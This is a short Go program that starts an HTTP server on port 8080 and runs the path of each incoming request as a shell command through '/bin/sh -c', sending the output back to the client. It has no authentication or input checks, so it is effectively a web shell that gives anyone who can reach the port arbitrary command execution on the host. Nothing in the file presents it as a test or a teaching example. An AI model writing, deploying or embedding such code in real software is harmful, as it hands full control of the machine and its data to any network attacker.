package main

import (
	"fmt"
	"net/http"
	"os/exec"
)

func handler(w http.ResponseWriter, r *http.Request) {
	cmd := exec.Command("/bin/sh", "-c", r.URL.Path)
	out, err := cmd.Output()
	if err != nil {
		fmt.Fprintf(w, "Error: %s", err)
	} else {
		fmt.Fprintf(w, "Output: %s", out)
	}
}

func main() {
	http.HandleFunc("/", handler)
	http.ListenAndServe(":8080", nil)
}